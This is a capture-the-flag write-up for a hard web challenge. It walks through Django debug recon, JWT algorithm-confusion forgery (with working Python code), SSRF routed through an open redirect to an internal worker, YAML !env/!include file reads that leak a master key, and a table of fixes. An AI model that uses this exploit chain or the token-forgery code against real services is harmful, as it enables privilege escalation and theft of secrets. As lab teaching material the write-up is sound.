# CloudNine — Writeup

- **Category:** Web
- **Difficulty:** Hard
- **Flag format:** `flag{}`
- **Target:** `http://15.252.91.100/` (alt `http://13.203.220.126/`)
- **Flag (this instance):** `flag{jwt_to_ssrf_to_yaml_cloudnine_complete}`
- **Master key (this instance):** `cn9-9d745c64bd245e62cfca5b8c35e6d4eabb0bc96694af82792815d7802e5bb096-CLOUDNINE-PLATFORM`

> The flag/master key are dynamic per instance. The chain below is what matters.

---

## 1. Brief

> CloudNine is an enterprise file-sharing service. A breach report suggests that its remote-ingestion pipeline may expose the platform's master encryption material. Begin with an ordinary account, investigate the service, and recover the master key.

Keywords in the brief map directly to the bug chain:
- "ordinary account" → self-registration
- "remote-ingestion pipeline" → server-side URL fetch = **SSRF**
- "master encryption material" → a signing key stored internally

The solve stitches **four** bugs together:
1. Recon (Django `DEBUG=True` leaks the URL map + backup endpoints).
2. JWT **algorithm confusion** (RS256 → HS256) → admin.
3. Admin-only **SSRF** + **open-redirect** allowlist bypass.
4. Internal config-worker **YAML `!env` / `!include`** → master key file read.

---

## 2. Recon

The app is Django (`vary: Cookie`, `x-content-type-options: nosniff`, `referrer-policy: same-origin`, trailing-slash routes, `nginx/1.24.0` front).

Register with an arithmetic captcha (`What is 8 + 6?` → `14`), then log in. Cookies received:
- `sessionid` — Django session (drives page auth)
- `cloudnine_access` — a **JWT**:
  - header: `{"alg":"RS256","kid":"cloudnine-prod","typ":"JWT"}`
  - payload: `{"iss":"cloudnine-auth","aud":"cloudnine-web","sub":"...","username":"...","role":"user","iat":...,"exp":...}`

Useful endpoints discovered from the authenticated dashboard and a `DEBUG=True` 404 URLconf dump:

```
register/  login/  logout/  dashboard/  upload/  files/
import/url/            [name='import_url']     <- remote ingestion (ADMIN only)
import/config/         [name='import_config']  <- YAML validator (users)
api/profile/
backup/auth/jwks.json  [name='backup_jwks']    <- public JWT key (n, e, kid)
backup/manifest.json   [name='backup_manifest']
redirect/              [name='legacy_redirect'] <- open redirect
```

`/api/profile/` (JSON) reports role + feature flags:
```json
{"database_role":"user","token_role":"user","is_admin":false,
 "token":{"algorithm":"RS256","key_id":"cloudnine-prod","status":"active"},
 "features":{"import_url":false,"config_validator":true,"file_upload":true}}
```

`/import/url/` returns **403 "Administrator access required."** — the SSRF exists but is admin-gated. So we must escalate first.

---

## 3. Privilege escalation — JWT algorithm confusion

The token is RS256 and the **public key is published** at `/backup/auth/jwks.json`:
```json
{"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":"cloudnine-prod","n":"1umJCKk-1k02...","e":"AQAB"}]}
```

An escalation battery ruled out the easy ones:
- `alg:none` (and `None`/`NONE`) → token `status: invalid`
- tampering the payload while keeping the real RS256 signature → `invalid`
- empty signature → `invalid`

The working variant is **RS256 → HS256 confusion** where the server verifies an HS256 token using the **JWK `n` value — the base64url modulus string itself — as the HMAC-SHA256 secret** (a very common "use the public key as the HMAC key" mistake, made worse by feeding the raw JWK string rather than the DER/PEM public key).

Forgery:
```python
import hmac, hashlib, json, base64, time
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

n_str = jwks["keys"][0]["n"]                       # base64url modulus, used verbatim
now = int(time.time())
header  = {"alg":"HS256","kid":"cloudnine-prod","typ":"JWT"}
payload = {**orig_payload, "role":"admin", "is_admin":True, "iat":now, "exp":now+36000}
si  = (b64u(json.dumps(header,separators=(",",":"))) + "." +
       b64u(json.dumps(payload,separators=(",",":")))).encode()
sig = hmac.new(n_str.encode(), si, hashlib.sha256).digest()
token = si.decode() + "." + b64u(sig)
# set cookie cloudnine_access = token
```

`/api/profile/` now returns `token_role: admin`, `is_admin: true`, and `features.import_url: true`. `/import/url/` is unlocked.

---

## 4. SSRF + open-redirect bypass

`/import/url/` fetches a user-supplied `url` server-side. The page HTML leaks the intended bypass in comments:
```html
<!-- legacy-callback: /redirect/?url= -->
<!-- worker-route: 127.0.0.1:9000 -->
```

Fetcher behavior:

| Target | Result |
|---|---|
| `http://example.com/` | fetched |
| `http://127.0.0.1/`, `localhost`, `169.254.169.254` | blocked — "Private and reserved network addresses are not permitted." |
| `file:///etc/passwd` | blocked — "Only HTTP and HTTPS URLs are supported." |
| `http://15.252.91.100/redirect/?url=<internal>` | **followed** — reaches any internal address |

The blocklist is a naive host string check, and the app's own `/redirect/?url=` is an **open redirect** the fetcher follows (302). So we bounce the SSRF through it:

```
http://15.252.91.100/redirect/?url=http://127.0.0.1:9000/<path>
```

Internal recon via the bounce:
- `169.254.169.254` → **IMDSv2** hardened (GET-only SSRF can't do the `PUT /latest/api/token` handshake) — deliberate dead end.
- `127.0.0.1:9000` → a service `cloudnine-config-worker` (not Django) — the real target.

---

## 5. Internal config-worker → YAML `!env` / `!include`

`GET http://127.0.0.1:9000/health` (via redirect bounce):
```json
{"service":"cloudnine-config-worker","status":"healthy","environment":"production",
 "config_endpoint":"/debug/config","diagnostic_marker":"FLAG{cloudnine_config_worker_healthy}"}
```

`GET /debug/config`:
```yaml
service: cloudnine-config-worker
parser:
  format: yaml
  endpoint: /debug/parse?config=<urlencoded-yaml>
  directives: [!env, !include]
  write_operations: disabled
  migration_marker: FLAG{cloudnine_parser_migration_complete}
encryption:
  provider: file
  key_reference: env:MASTER_KEY_PATH
```

The parser at `/debug/parse?config=` accepts a **single scalar node** with a custom tag:
- `!env NAME` — resolve an allowlisted env var
- `!include PATH` — read a file within a permitted secrets directory

**Step 1 — resolve the key path** (only `MASTER_KEY_PATH` is permitted):
```
GET /redirect/?url=http://127.0.0.1:9000/debug/parse?config=%21env%20MASTER_KEY_PATH
→ /opt/cloudnine/source/secrets/master.key
```

**Step 2 — include the file** (inside the allowed secrets dir, so it passes the traversal guard):
```
config = !include /opt/cloudnine/source/secrets/master.key
→ MASTER_KEY=cn9-9d745c64...-CLOUDNINE-PLATFORM  FLAG{jwt_to_ssrf_to_yaml_cloudnine_complete}
```

The master key file also contains the **real flag**. Its co-location with the key is what distinguishes it from the decoys.

---

## 6. Decoys

Three uppercase `FLAG{...}` markers are decoys, none matching the required `flag{}`:
- `/backup/manifest.json` → `validation_marker`
- `:9000/health` → `diagnostic_marker` = `FLAG{cloudnine_config_worker_healthy}`
- `:9000/debug/config` → `migration_marker` = `FLAG{cloudnine_parser_migration_complete}`

Only the string from `master.key` is real: `flag{jwt_to_ssrf_to_yaml_cloudnine_complete}`.

---

## 7. Attack chain (end to end)

```
register + login  (RS256 JWT role=user; public key at /backup/auth/jwks.json)
      │
      ▼  JWT alg-confusion: HS256 signed with the JWK `n` modulus string → role=admin
admin unlocks POST /import/url/  (server-side fetch = SSRF)
      │  host blocklist bypassed via /redirect/?url=  (open redirect the fetcher follows)
      ▼
internal cloudnine-config-worker @ 127.0.0.1:9000
      │  /health → /debug/config → YAML parser /debug/parse?config=
      ▼
!env MASTER_KEY_PATH → /opt/cloudnine/source/secrets/master.key
!include <that path> → master key + flag
      (IMDSv2 @169.254.169.254 is a hardened dead end)
```

---

## 8. Root causes & fixes

| Bug | Root cause | Fix |
|---|---|---|
| Info leak | `DEBUG=True` in prod leaks URLconf + settings | Disable DEBUG; generic error pages |
| Auth bypass | JWT verified with header-chosen alg; HMAC key = public modulus string | Pin `algorithms=["RS256"]`; never let public material act as a symmetric key |
| SSRF | Fetches user URLs with a string-based host blocklist | Resolve + validate final IP after redirects; deny loopback/link-local/private; disable cross-host redirects |
| Open redirect | `/redirect/?url=` follows arbitrary absolute URLs | Allowlist redirect targets to same-site paths |
| File read | `!include`/`!env` reachable from an internal debug endpoint | Remove debug parser in prod; drop custom tags; strict path canonicalization + allowlist |
| Secret exposure | Master key readable as a file on a network-reachable worker | Use a KMS/secret manager; keep secrets off reachable workers |

---

## 9. Reproduction scripts

Saved in the workspace:
- `cn_pwn.py` — register + JWKS fetch + HS256 forgery → admin
- `cn_ssrf2.py` — enumerate `/import/url/` and confirm redirect/worker hints
- `cn_final.py` — SSRF bounce → `/health`, `/debug/config`, `!env MASTER_KEY_PATH`
- `cn_getflag.py` — `!include` the master.key path → master key + flag

Usage (works against either instance):
```
python cn_pwn.py http://15.252.91.100
python cn_getflag.py http://15.252.91.100
```
